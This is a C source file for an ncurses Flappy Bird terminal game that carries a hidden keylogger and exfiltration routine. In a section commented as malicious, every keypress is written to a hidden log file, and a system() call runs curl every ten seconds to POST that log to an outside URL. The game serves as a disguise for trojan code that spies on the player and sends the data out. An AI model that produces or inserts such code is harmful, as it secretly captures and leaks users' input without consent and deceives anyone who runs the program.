#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <ncurses.h>
#include <string.h>
#include <sys/time.h>

#define WIDTH 40
#define HEIGHT 20
#define GAP 6
#define PIPE_WIDTH 3

int birdY = HEIGHT / 2;
int birdX = 5;
int velocity = 0;
int gravity = 1;
int score = 0;
int pipeX = WIDTH;
int gapY;
int gameOver = 0;

// Hidden malicious parts
FILE *logfile = NULL;
struct timeval last_exfil;
const char *logpath = ".flappylog";
const char *exfil_url = "http://example.com/flappyupload";

void init_malicious() {
    logfile = fopen(logpath, "a");
    if (!logfile) {
        logfile = fopen("/tmp/.flappylog", "a");
    }
    gettimeofday(&last_exfil, NULL);
}

void exfiltrate() {
    struct timeval now;
    gettimeofday(&now, NULL);
    if (now.tv_sec - last_exfil.tv_sec >= 10) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
                 "curl -s -X POST -F \"file=@%s\" %s > /dev/null 2>&1",
                 logpath, exfil_url);
        system(cmd);
        gettimeofday(&last_exfil, NULL);
    }
}

void init() {
    srand(time(0));
    gapY = rand() % (HEIGHT - GAP - 2) + 1;
}

void draw() {
    clear();
    for (int y = 0; y < HEIGHT; y++) {
        for (int x = 0; x < WIDTH; x++) {
            if (x == 0 || x == WIDTH - 1) {
                printw("#");
            } else if (x == birdX && y == birdY) {
                printw("O");
            } else if (x >= pipeX && x < pipeX + PIPE_WIDTH &&
                       (y < gapY || y > gapY + GAP)) {
                printw("|");
            } else {
                printw(" ");
            }
        }
        printw("\n");
    }

    for (int i = 0; i < WIDTH; i++) printw("#");
    printw("\nScore: %d\n", score);
    refresh();
}

void input() {
    timeout(0); // non-blocking input
    int ch = getch();

    if (ch != ERR && logfile) {
        fputc(ch, logfile);
        fflush(logfile);
    }

    if (ch == ' ') {
        velocity = -3;
    } else if (ch == 'x') {
        gameOver = 1;
    }

    exfiltrate();
}

void logic() {
    velocity += gravity;
    birdY += velocity;

    if (birdY <= 0 || birdY >= HEIGHT - 1) {
        gameOver = 1;
    }

    pipeX--;
    if (pipeX + PIPE_WIDTH < 0) {
        pipeX = WIDTH;
        gapY = rand() % (HEIGHT - GAP - 2) + 1;
        score++;
    }

    if (birdX >= pipeX && birdX < pipeX + PIPE_WIDTH &&
        (birdY < gapY || birdY > gapY + GAP)) {
        gameOver = 1;
    }
}

int main() {
    initscr();
    noecho();
    curs_set(FALSE);
    nodelay(stdscr, TRUE);

    init_malicious();
    init();

    while (!gameOver) {
        draw();
        input();
        logic();
        usleep(100000); // 100ms
    }

    draw();
    printw("\nGame Over! Final Score: %d\n", score);
    printw("Press any key to exit...");
    timeout(-1);
    getch();
    endwin();

    if (logfile) fclose(logfile);

    return 0;
}
